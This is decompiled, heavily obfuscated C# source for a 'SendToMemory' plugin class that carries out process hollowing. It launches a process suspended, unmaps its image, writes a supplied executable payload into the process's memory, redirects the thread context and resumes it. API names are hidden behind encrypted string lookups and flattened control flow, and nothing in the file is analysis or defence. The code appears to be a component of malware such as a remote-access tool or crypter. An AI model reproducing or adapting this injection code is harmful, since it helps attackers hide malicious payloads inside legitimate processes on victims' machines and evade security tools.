using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using HsZcU78F13T1yLWI1V;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public static class SendToMemory
{
	private delegate int DelegateResumeThread(IntPtr handle);

	private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

	private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);

	private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct ProcessInformation
	{
		public readonly IntPtr ProcessHandle;

		public readonly IntPtr ThreadHandle;

		public readonly uint ProcessId;

		private readonly uint ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct StartupInformation
	{
		public uint Size;

		private readonly string Reserved1;

		private readonly string Desktop;

		private readonly string Title;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] Misc;

		private readonly IntPtr Reserved2;

		private readonly IntPtr StdInput;

		private readonly IntPtr StdOutput;

		private readonly IntPtr StdError;
	}

	private static readonly DelegateResumeThread ResumeThread;

	private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext;

	private static readonly DelegateSetThreadContext SetThreadContext;

	private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext;

	private static readonly DelegateGetThreadContext GetThreadContext;

	private static readonly DelegateVirtualAllocEx VirtualAllocEx;

	private static readonly DelegateWriteProcessMemory WriteProcessMemory;

	private static readonly DelegateReadProcessMemory ReadProcessMemory;

	private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection;

	private static readonly DelegateCreateProcessA CreateProcessA;

	private static SendToMemory bGadX7mAys5IPuBHQ23;

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[MethodImpl(MethodImplOptions.NoInlining)]
	private unsafe static CreateApi LoadApi<CreateApi>(object name, object method)
	{
		return (CreateApi)(object)bXRtgyzXmGLcLV2FMh.zfjs75BRd(GetProcAddress(LoadLibraryA(ref *(string*)(&name)), ref *(string*)(&method)), kZpGS6u9nKdrmqOf8V.zfjs75BRd(typeof(CreateApi).TypeHandle, kZpGS6u9nKdrmqOf8V.s89KY6uDC), bXRtgyzXmGLcLV2FMh.xX9sxCXB5m);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Execute(string path, byte[] data)
	{
		int num = 10;
		int num3 = default(int);
		StartupInformation startupInfo = default(StartupInformation);
		ProcessInformation processInformation = default(ProcessInformation);
		short num16 = default(short);
		int num7 = default(int);
		int num13 = default(int);
		int num12 = default(int);
		int num10 = default(int);
		int bufferSize = default(int);
		int bytesWritten = default(int);
		int num8 = default(int);
		int num14 = default(int);
		int[] array = default(int[]);
		int num6 = default(int);
		int num5 = default(int);
		int buffer2 = default(int);
		int num9 = default(int);
		bool flag = default(bool);
		int num15 = default(int);
		byte[] array2 = default(byte[]);
		int num11 = default(int);
		int length = default(int);
		byte[] buffer = default(byte[]);
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				case 3:
				case 9:
					if (num3 < 10)
					{
						num2 = 8;
						goto IL_0012;
					}
					return;
				case 7:
					break;
				case 10:
					num3 = 0;
					num2 = 9;
					goto IL_0012;
				case 6:
					num3++;
					num2 = 3;
					if (kA3kTEmqTYg9xC5pUDQ())
					{
						num2 = 3;
					}
					goto IL_0012;
				case 2:
					try
					{
						if (CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
						{
							int num4 = 11;
							while (true)
							{
								switch (num4)
								{
								case 28:
									num16 = jOBWgWsvWAbX2hGSAnB.zfjs75BRd(data, num7 + 6, jOBWgWsvWAbX2hGSAnB.zXfsoxmRti);
									num4 = 27;
									if (kA3kTEmqTYg9xC5pUDQ())
									{
										num4 = 32;
									}
									continue;
								case 38:
									break;
								case 11:
									num7 = cXnbIhmG2hnFfcPZOoD(data, 60, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 27;
									continue;
								case 39:
									num13++;
									num12 = 4;
									goto IL_00fe;
								case 46:
									throw new Exception();
								case 12:
									throw new Exception();
								case 19:
									throw new Exception();
								case 10:
									if (qoj9numsTWULI7X5ovA(ResumeThread, processInformation.ThreadHandle) == -1)
									{
										num4 = 33;
										if (kA3kTEmqTYg9xC5pUDQ())
										{
											continue;
										}
										goto IL_00fe;
									}
									return;
								case 23:
									throw new Exception();
								case 17:
									if (WriteProcessMemory(processInformation.ProcessHandle, num10, data, bufferSize, ref bytesWritten))
									{
										num4 = 18;
										if (kA3kTEmqTYg9xC5pUDQ())
										{
											continue;
										}
										goto IL_00fe;
									}
									goto case 14;
								case 14:
									throw new Exception();
								case 18:
									num8 = num7 + 248;
									num4 = 28;
									continue;
								default:
									num14 = cXnbIhmG2hnFfcPZOoD(data, num8 + 12, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 47;
									if (kA3kTEmqTYg9xC5pUDQ())
									{
										continue;
									}
									goto IL_00fe;
								case 21:
									throw new Exception();
								case 48:
									array[0] = 65538;
									num4 = 31;
									continue;
								case 35:
									array[44] = num10 + num6;
									num4 = 7;
									continue;
								case 37:
									if (num10 != 0)
									{
										num4 = 17;
										continue;
									}
									goto case 23;
								case 15:
									if (SetThreadContext(processInformation.ThreadHandle, array))
									{
										num4 = 10;
										if (kA3kTEmqTYg9xC5pUDQ())
										{
											num4 = 10;
										}
										continue;
									}
									goto case 46;
								case 41:
									throw new Exception();
								case 25:
								case 26:
									num8 += 40;
									num4 = 39;
									continue;
								case 24:
									if (!ReadProcessMemory(processInformation.ProcessHandle, num5 + 8, ref buffer2, 4, ref bytesWritten))
									{
										num4 = 43;
										continue;
									}
									if (num9 == buffer2)
									{
										num4 = 36;
										continue;
									}
									goto IL_0360;
								case 4:
								case 5:
									if (num13 < num16)
									{
										num4 = 0;
										if (o95vahm2XCVi0ZJiggo() != null)
										{
											num4 = 0;
										}
										continue;
									}
									goto case 49;
								case 16:
									if (flag)
									{
										num4 = 3;
										if (kA3kTEmqTYg9xC5pUDQ())
										{
											continue;
										}
										goto IL_00fe;
									}
									goto case 35;
								case 20:
									throw new Exception();
								case 6:
									JfboQ2mWjMj7PcvRPHF(data, num15, array2, 0, array2.Length, M8R7fIsqZhJXtdDnky9.HGHsU6fuck);
									num4 = 2;
									if (kA3kTEmqTYg9xC5pUDQ())
									{
										continue;
									}
									goto IL_00fe;
								case 22:
									flag = false;
									num4 = 34;
									if (o95vahm2XCVi0ZJiggo() != null)
									{
										num4 = 2;
									}
									continue;
								case 40:
									num15 = cXnbIhmG2hnFfcPZOoD(data, num8 + 20, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 13;
									continue;
								case 2:
									if (WriteProcessMemory(processInformation.ProcessHandle, num10 + num14, array2, array2.Length, ref bytesWritten))
									{
										num12 = 26;
										goto IL_00fe;
									}
									goto case 41;
								case 13:
									if (num11 == 0)
									{
										num4 = 25;
										continue;
									}
									goto case 44;
								case 7:
									if (KmSY93mLSg9gCW1vYgN(EgmJ9MsSbw2qbV7oTeB.w98sRFKTEp) != 4)
									{
										if (!M3FM8ImURL4EW50GaCL(Wow64SetThreadContext, processInformation.ThreadHandle, array))
										{
											num12 = 19;
											goto IL_00fe;
										}
										goto case 10;
									}
									num4 = 15;
									continue;
								case 9:
									bufferSize = ztBZ1plL1EHT3M8fZE.zfjs75BRd(data, num7 + 84, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 22;
									continue;
								case 31:
									if (KmSY93mLSg9gCW1vYgN(EgmJ9MsSbw2qbV7oTeB.w98sRFKTEp) != 4)
									{
										if (Wow64GetThreadContext(processInformation.ThreadHandle, array))
										{
											goto IL_049d;
										}
										num4 = 20;
										if (o95vahm2XCVi0ZJiggo() == null)
										{
											continue;
										}
									}
									else
									{
										num4 = 1;
										if (o95vahm2XCVi0ZJiggo() == null)
										{
											continue;
										}
									}
									goto IL_00fe;
								case 3:
									num10 = num9;
									num12 = 35;
									goto IL_00fe;
								case 1:
									if (!TlSprEmeJcPBX8vep95(GetThreadContext, processInformation.ThreadHandle, array))
									{
										num4 = 12;
										continue;
									}
									goto IL_049d;
								case 32:
									num13 = 0;
									num4 = 5;
									continue;
								case 36:
									if (lvDeXympGdEKnXUpiHK(ZwUnmapViewOfSection, processInformation.ProcessHandle, buffer2) != 0)
									{
										num4 = 21;
										continue;
									}
									goto IL_0360;
								case 44:
									array2 = new byte[num11];
									num4 = 6;
									continue;
								case 42:
									throw new Exception();
								case 47:
									num11 = cXnbIhmG2hnFfcPZOoD(data, num8 + 16, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num12 = 40;
									goto IL_00fe;
								case 8:
									buffer2 = 0;
									num4 = 24;
									continue;
								case 34:
									num10 = LTmQUjm1oEL3WBcRZvx(VirtualAllocEx, processInformation.ProcessHandle, num9, length, 12288, 64);
									num4 = 37;
									continue;
								case 27:
									num9 = ztBZ1plL1EHT3M8fZE.zfjs75BRd(data, num7 + 52, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 45;
									if (kA3kTEmqTYg9xC5pUDQ())
									{
										continue;
									}
									goto IL_00fe;
								case 30:
									if (WriteProcessMemory(processInformation.ProcessHandle, num5 + 8, buffer, 4, ref bytesWritten))
									{
										num6 = cXnbIhmG2hnFfcPZOoD(data, num7 + 40, ztBZ1plL1EHT3M8fZE.oOpnahh41);
										num4 = 16;
									}
									else
									{
										num4 = 42;
									}
									continue;
								case 45:
									array = new int[179];
									num4 = 21;
									if (kA3kTEmqTYg9xC5pUDQ())
									{
										num4 = 48;
									}
									continue;
								case 49:
									buffer = (byte[])YpQKJtm370HhjlqD3rn(num10, HW3VNcECqFoBydJucM.uqVfY2wBD);
									num4 = 30;
									continue;
								case 43:
									throw new Exception();
								case 33:
									{
										throw new Exception();
									}
									IL_00fe:
									num4 = num12;
									continue;
									IL_049d:
									num5 = array[41];
									num4 = 8;
									continue;
									IL_0360:
									length = cXnbIhmG2hnFfcPZOoD(data, num7 + 80, ztBZ1plL1EHT3M8fZE.oOpnahh41);
									num4 = 9;
									if (o95vahm2XCVi0ZJiggo() != null)
									{
										num4 = 9;
									}
									continue;
								}
								break;
							}
						}
						throw new Exception();
					}
					catch
					{
						int num17 = 1;
						if (kA3kTEmqTYg9xC5pUDQ())
						{
							num17 = 1;
						}
						while (true)
						{
							switch (num17)
							{
							case 1:
								gImuISGa1sbYwQq5W0.zfjs75BRd(SgcbrnmQBnrLiOujWEW(i7cnBUsCDVlAuCu2MHp.zfjs75BRd(processInformation.ProcessId, i7cnBUsCDVlAuCu2MHp.mBhs621XgR), LkAK3Ss07HFGpyxiMAU.qQXs2bRZ2v), gImuISGa1sbYwQq5W0.sxRsM5Oiyk);
								num17 = 0;
								if (kA3kTEmqTYg9xC5pUDQ())
								{
									num17 = 0;
								}
								continue;
							case 0:
								break;
							}
							break;
						}
					}
					goto case 6;
				case 4:
					return;
				default:
					bytesWritten = 0;
					num2 = 1;
					if (kA3kTEmqTYg9xC5pUDQ())
					{
						num2 = 1;
					}
					goto IL_0012;
				case 5:
					startupInfo.Size = yrqFFxmBxVkh1U965rH(O9fo5hssPqB3TB98Kcn.zfjs75BRd(kZpGS6u9nKdrmqOf8V.zfjs75BRd(typeof(StartupInformation).TypeHandle, kZpGS6u9nKdrmqOf8V.s89KY6uDC), O9fo5hssPqB3TB98Kcn.h00sg8nEQj), ilSMj6sLvqeK77UaOeG.hFPsjceMWB);
					num2 = 0;
					if (kA3kTEmqTYg9xC5pUDQ())
					{
						num2 = 2;
					}
					goto IL_0012;
				case 1:
					startupInfo = default(StartupInformation);
					num2 = 7;
					if (!kA3kTEmqTYg9xC5pUDQ())
					{
						num2 = 7;
					}
					goto IL_0012;
				}
				processInformation = default(ProcessInformation);
				num2 = 5;
			}
			while (kA3kTEmqTYg9xC5pUDQ());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static SendToMemory()
	{
		int num = 6;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
					return;
				case 10:
					VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>(rX15ANmJKoms6sf5yZe(100), rX15ANmJKoms6sf5yZe(312));
					num2 = 9;
					if (true)
					{
						continue;
					}
					break;
				case 6:
					WkMgYHbfSUMGdoITRx.Or1mDVszdQNN8();
					num2 = 5;
					continue;
				default:
					SetThreadContext = LoadApi<DelegateSetThreadContext>(rX15ANmJKoms6sf5yZe(100), rX15ANmJKoms6sf5yZe(194));
					num2 = 1;
					if (0 == 0)
					{
						continue;
					}
					break;
				case 2:
					GetThreadContext = LoadApi<DelegateGetThreadContext>(rX15ANmJKoms6sf5yZe(100), rX15ANmJKoms6sf5yZe(276));
					num = 10;
					break;
				case 1:
					Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>(rX15ANmJKoms6sf5yZe(100), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(230));
					num2 = 2;
					continue;
				case 11:
					ReadProcessMemory = LoadApi<DelegateReadProcessMemory>(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(100), rX15ANmJKoms6sf5yZe(384));
					num2 = 8;
					continue;
				case 4:
					CreateProcessA = LoadApi<DelegateCreateProcessA>(rX15ANmJKoms6sf5yZe(100), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(480));
					num2 = 3;
					continue;
				case 8:
					ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>(rX15ANmJKoms6sf5yZe(422), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(436));
					num2 = 4;
					continue;
				case 5:
					ResumeThread = LoadApi<DelegateResumeThread>(rX15ANmJKoms6sf5yZe(100), rX15ANmJKoms6sf5yZe(120));
					num2 = 7;
					continue;
				case 9:
					WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(100), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(344));
					num2 = 11;
					if (true)
					{
						continue;
					}
					break;
				case 7:
					Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>(rX15ANmJKoms6sf5yZe(100), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(148));
					num2 = 0;
					if (0 == 0)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static uint yrqFFxmBxVkh1U965rH(int P_0, object P_1)
	{
		return ilSMj6sLvqeK77UaOeG.zfjs75BRd(P_0, (ilSMj6sLvqeK77UaOeG)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int cXnbIhmG2hnFfcPZOoD(object P_0, int P_1, object P_2)
	{
		return ztBZ1plL1EHT3M8fZE.zfjs75BRd((byte[])P_0, P_1, (ztBZ1plL1EHT3M8fZE)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int KmSY93mLSg9gCW1vYgN(object P_0)
	{
		return EgmJ9MsSbw2qbV7oTeB.zfjs75BRd((EgmJ9MsSbw2qbV7oTeB)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool TlSprEmeJcPBX8vep95(object P_0, IntPtr thread, object P_2)
	{
		return P_0(thread, (int[])P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int lvDeXympGdEKnXUpiHK(object P_0, IntPtr process, int baseAddress)
	{
		return P_0(process, baseAddress);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int LTmQUjm1oEL3WBcRZvx(object P_0, IntPtr handle, int address, int length, int type, int protect)
	{
		return P_0(handle, address, length, type, protect);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JfboQ2mWjMj7PcvRPHF(object P_0, int P_1, object P_2, int P_3, int P_4, object P_5)
	{
		M8R7fIsqZhJXtdDnky9.zfjs75BRd((Array)P_0, P_1, (Array)P_2, P_3, P_4, (M8R7fIsqZhJXtdDnky9)P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object YpQKJtm370HhjlqD3rn(int P_0, object P_1)
	{
		return HW3VNcECqFoBydJucM.zfjs75BRd(P_0, (HW3VNcECqFoBydJucM)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool M3FM8ImURL4EW50GaCL(object P_0, IntPtr thread, object P_2)
	{
		return P_0(thread, (int[])P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int qoj9numsTWULI7X5ovA(object P_0, IntPtr handle)
	{
		return P_0(handle);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object SgcbrnmQBnrLiOujWEW(int P_0, object P_1)
	{
		return LkAK3Ss07HFGpyxiMAU.zfjs75BRd(P_0, (LkAK3Ss07HFGpyxiMAU)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool kA3kTEmqTYg9xC5pUDQ()
	{
		return bGadX7mAys5IPuBHQ23 == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static SendToMemory o95vahm2XCVi0ZJiggo()
	{
		return bGadX7mAys5IPuBHQ23;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rX15ANmJKoms6sf5yZe(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}
}
